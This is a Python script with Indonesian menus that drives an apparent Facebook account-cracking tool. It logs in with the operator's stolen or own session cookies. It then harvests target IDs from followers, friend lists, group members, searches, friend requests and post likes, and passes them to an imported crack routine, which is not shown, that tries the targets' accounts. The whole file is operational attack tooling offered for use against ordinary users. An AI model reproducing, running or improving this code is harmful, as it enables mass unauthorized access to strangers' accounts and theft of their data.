from modul import *
from wibu.login import login
from .pepek import shielded as guard
from .ngewe import crack as cracking
from .ngewe import gadag_user as asu
from .report_bug import report as laporkan

url="https://mbasic.facebook.com"
loBosku="lo lebih Bosku"

class awokawokawok:
	
	def __init__(self):
		self.cek_folder()
		self.semua=open("cookies/info.txt").read()
		self.jonson=json.loads(self.semua)
		self.cookies=self.jonson["cookies"]
		self.main_menu()
		
	def cek_folder(self):
		if os.path.exists("result") is False: os.mkdir("result")
		if os.path.exists("cookies") is False: os.mkdir("cookies")
		if os.path.exists("result/live.txt") is False: open("result/live.txt","a")
		if os.path.exists("result/chek.txt") is False: open("result/chek.txt","a")
		if os.path.exists("cookies/info.txt") is False:
			os.system("clear")
			cookie=input("\n\033[0;32m MASUKAN COOKIES\n\n\033[0;34mCOOKIE FACEBOOK")
			while cookie in (""," "):
				print("\033[0;31mCOOKIES KOSONG")
				cookie=input("\033[0;34mCOOKIES FACEBOOK")
			login(url,{"cookie":cookie})
	
	def cek_cookies(self):
		global url
		try: respon=req.get(f"{url}/profile.php",cookies=self.cookies)
		except koneksi_error: exit("\033[0;31mKONEKSI FAILED")
		if "mbasic_logout_button" not in respon.text:
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit("\033[0;31mCOOKIE EXPIRED HARAP CEK AKUN")
		url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
		os.system("clear")
	
	def set_ua(self):
		print("\n\033[0;32mUA SAAT INI⋙ ,"+open("saya_gans/ngewe/.useragent").read().strip()+"\n" if os.path.exists("saya_gans/ngewe/.useragent") else "")
		ua=input("\033[0;32mMASUKAN UA\033[0;36m⋙")
		while ua in (""," "):
			print("\033[0;31mUA KOSOSOG")
			ua=input("\033[0;32mMASUKAN UA\033[0;36m⋙")
		open("saya_gans/ngewe/.useragent","w").write(ua)
		print("\n\033[0;34mSUKSES MENGGATI UA" if os.path.exists("saya_gans/ngewe/.useragent") else "\n\033[0;31mGAGAL MENGGANTI UA")
		exit("\033[0;32mRESTART  SCRIPT NYA")
	
	def main_menu(self):
		global loBosku
		self.cek_cookies()
		takeuser=asu(url,self.cookies)
		print("\033[0;34m╔═╗\033[0;36m╔╦╗\033[0;35m╔═")
		print("\033[0;34m╠═╣\033[0;36m║║║\033[0;35m╚═ ")
		print("\033[0;34m║║║\033[0;36m║║║\033[0;35m║\033[0;31mCRACK")
		print("\033[0;35m╔╦╦╦═╦╗╔═╦═╦══╦═╗\033[0;34mMADE")
		print("\033[0;35m║║║║╩╣╚╣═╣║║║║║╩╣\033[0;32mBY")
		print("\033[0;35m╚══╩═╩═╩═╩═╩╩╩╩═╝\033[0;36mBANG \033[0;31mANDI-X")
		print(f"\033[0;34m╔═ID \033[0;32m➣ {self.jonson['uid']} ")
		print(f"\033[0;34m╠═NAME \033[0;32m➣ {self.jonson['nama']} ")
		print(f"\033[0;34m╚═USERNAME \033[0;32m➣ {self.jonson['username']} \n" if self.jonson["username"] is not None else "")
		print("\033[0;34m╔═\033[0;31mC.\033[4;33mCRACK FOLLOWER")
		print("\033[0;34m╠═\033[0;31mB.\033[4;33mCRACK DAFTAR TEMAN")
		print("\033[0;34m╠═\033[0;31mK.\033[4;33mCRACK MEMBER GROUP")
		print("\033[0;34m╠═\033[0;31mO.\033[4;33mCRACK DARI PENCARIAN NAMA")
		print("\033[0;34m╠═\033[0;31mP.\033[4;33mCRACK DARI TEMAN TARGET")
		print("\033[0;34m╠═\033[0;31mS.\033[4;33mCRACK DARI PERMINTAAN PERTEMANAN")
		print("\033[0;34m╠═\033[0;31mG.\033[4;33mCRACK DARI LIKE POST")
		print("\033[0;34m╠═\033[0;31mU.\033[0;31mHAPUS COOKIE")
		print("\033[0;34m╠═\033[0;31mH.\033[0;31mLAPORKAN MASALAH")
		print("\033[0;34m╠═\033[0;31mV.\033[0;31mATUR UA")
		print("\033[0;34m╚═\033[0;31mX.\033[0;31mKELUAR")
		 
		pilih=input("\033[0;32m╔═PILIH═\033[0;34m⋙")
		while pilih in (""," "):
			print("\033[0;31m╚═PILIHAN KOSONG.!")
			pilih=input("\033[0;32m╔═PILIH═\033[0;34m⋙")
			
		if pilih in ("c","C"):
			user=input("\033[0;32m╠═USERNAME/ID \033[0;34m⋙")
			while user in (""," "):
				print("\033[0;31m╠═USERNAME/ID KOSONG")
				user=input("\033[0;32m╠═USERNAME/ID \033[0;34m⋙")
			usek=f"{url}/profile.php?id={user}&v=followers" if user.isdigit() else f"{url}/{user}?v=followers"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\033[0;31m╚═KONEKSI FAILED")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f"\033[0;31m╚═PENGUNA {user} TIDAK DITEMUKAN" if user.isdigit() else f" AKUN {user} TIDAK DITEMUKAN",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali("\033[0;31m╚═LIMIT SILAHKAN  GANTI AKUN",self.main_menu)
			else:
				print("\033[0;32m╚═NAMA\033[0;34m⋙"+parser(respon,"html.parser").find("title").text)
				loBosku=takeuser.followers(respon)
			
		elif pilih in ("b","B"):
			usek=f"{url}/me/friends" if self.jonson['username'] else f"{url}/profile.php?v=friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\033[0;31m╚═KONEKSI FAILED")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali("\033[0;31m╚═TIDAK ADA TEMAN",self.main_menu)
			loBosku=takeuser.fl(respon)
			
		elif pilih in ("k","K"):
			user=input("\033[0;32m╠═ID GROUP\033[0;34⋙")
			while user in (""," "):
				print("\033[0;31m╠═ID GROUP KOSONG.")
				user=input("\033[0;32m╠═ID GROUP\033[0;34⋙")
			usek=f"{url}/browse/group/members/?id={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\033[0;31m╚═KONEKSI FAILED")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f"\033[0;31m╚═GROUP {user} TIDAK DITEMUKAN  ",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali("\033[0;31m╚═LIMIT  SILAHKAN GANTI AKUN",self.main_menu)
			else:
				print("\033[0;32m╚═NAMA GROUP\033[0;34⋙"+parser(respon,"html.parser").find("title").text[8:])
				loBosku=takeuser.grup(respon,user)
			
		elif pilih in ("o","O"):
			print("\033[0;35m╠═ISI  DENGGAN   NAMA TARGET")
			user=input("\033[0;32m╠═TARGET\033[0;34m⋙")
			while user in (""," "):
				print("\033[0;31m╠═NAMA TARGET KOSONG")
				user=input("\033[0;32m╠═TARGET\033[0;34m⋙")
			usek=f"{url}/search/people/?q={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Maaf, kami tidak menemukan" in respon:
				kembali(f"\033[0;31m╚═ORANG {user} TIDAK DITEMUKAN",self.main_menu)
			else:
				jumlah=input("\033[0;34m╠═JUMLAH")
				while jumlah.isdigit() is False:
					print("\033[0;31m╚═JUMLAH KOSONG" if jumlah in (""," ") else " HARUS BERUPA ANGKA")
					jumlah=input("\033[0;34m╠═JUMLAH")
				loBosku=takeuser.cari(respon,int(jumlah))
			
		elif pilih in ("p","P"):
			user=input("\033[0;32m╠═TARGET\033[0;34m⋙")
			while user in (""," "):
				print("\033[0;31m╠═USERNAME/ID KOSONG")
				user=input("\033[0;31m╠═TARGET\033[0;34m⋙")
			usek=f"{url}/profile.php?id={user}&v=friends" if user.isdigit() else f"{url}/{user}/friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\033[0;31m╚═KONEKSI FAILED")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali("\033[0;31m╚═DAFTAR TEMAN DI PRIVASI",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali("\033[0;31m╚═LIMIT SILAHKAN GANTI AKUN",self.main_menu)
			if "Konten Tidak Ditemukan" in respon or "Halaman yang Anda minta tidak ditemukan." in respon:
				kembali(f"\033[0;31m╚═PENGGUNA {user} TIDAK TEMUKAN" if user.isdigit() else f"\033[0;31m╚═PENGGUNA {user} TIDAK DITEMUKAN",self.main_menu)
			else:
				print("\033[0;31m╠═NAMA TARGET\033[0;34m⋙"+parser(respon,"html.parser").find("title").text)
				loBosku=takeuser.fl(respon)
			
		elif pilih in ("s","S"):
			try: respon=req.get(f"{url}/friends/center/requests/#friends_center_main",cookies=self.cookies).text
			except koneksi_error: exit("\033[0;32m╚═KONEKSI FAILED")
			if "Tidak Ada Permintaan" in respon:
				kembali("\033[0;32m╚═TIDAK ADA PERMINTAAN PERTEMANAN",self.main_menu)
			loBosku=takeuser.request(respon)
			
		elif pilih in ("g","G"):
			user=input("\033[0;32m╠═ID POST\033[0;34m⋙")
			while user in (""," "):
				print("╠═ID POST INGGAN KOSONG")
				user=input("\033[0;32m╠═ID POST\033[0;34m⋙")
			if user.isdigit():
				user=f"{url}/{user}"
			else:
				try: asyu=re.search("https://(.*?)\.facebook\.com/",user).group(1)
				except AttributeError: exit("\033[0;31m╚═MASUKAN ID POST DENGGAN BENAR")
				user=url+user.split(f"https://{asyu}.facebook.com")[1]
			try: respon=req.get(user,cookies=self.cookies).text
			except koneksi_error: exit("\033[0;31m╚═KONEKSI FAILED")
			if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
				kembali("\033[0;31m╚═POSTINGGAN TIDAK ADA",self.main_menu)
			try:
				ufi=re.search('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon).group(1).replace(";","&")
				respon=req.get(f"{url}/ufi/reaction/profile/browser/{ufi}",cookies=self.cookies).text
				if "Semua 0" in respon or "Orang yang menanggapi" not in respon:
					kembali("\033[0;31m╚═TIDAK ADA YANG MENANGGAPI POSTINGGAN",self.main_menu)
				jumlah=input("\033[0;32m╠═JUMLAH\033[0;34m⋙")
				while jumlah.isdigit() is False:
					print("\033[0;31m╚═JUMLAH KOSONG" if jumlah in (""," ") else " HARUS BERUPA ANGKA")
					jumlah=input("\033[0;32m╠═JUMLAH\033[0;34m⋙")
				loBosku=takeuser.like_post(respon,int(jumlah))
			except AttributeError: exit("\033[0;31m╚═ERROR")
			except koneksi_error: exit("\033[0;31m╚═KONEKSI FAILED")
			
		elif pilih in ("8","08"):
			guard(url,self.cookies,self.main_menu)
		
		elif pilih in ("u","U"):
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit("\033[0;31m╚═GAGAL HAPUS COOKIE" if os.path.exists("cookies/info.txt") else "\033[0;32m╚═SUKSES")
		
		elif pilih in tuple("hH"):
			laporkan(url,self.cookies)
		
		elif pilih in tuple("vV"):
			self.set_ua()
		
		
		elif pilih in ("x","X"):
			exit("\033[0;36m╚═GOOD BYE MY FRIEND")
		
		else:
			kembali("\033[0;31m╚═PILIHAN TIDAK ADA",self.main_menu)
		
		if loBosku!="lo lebih Bosku":
			if len(loBosku)!=0:
				cracking.crack(url,loBosku)
			else:
				exit("\033[0;31m╚═ID GAGAL DI AMBIL")
		else:
			exit("\033[0;31m╚═ERROR ")
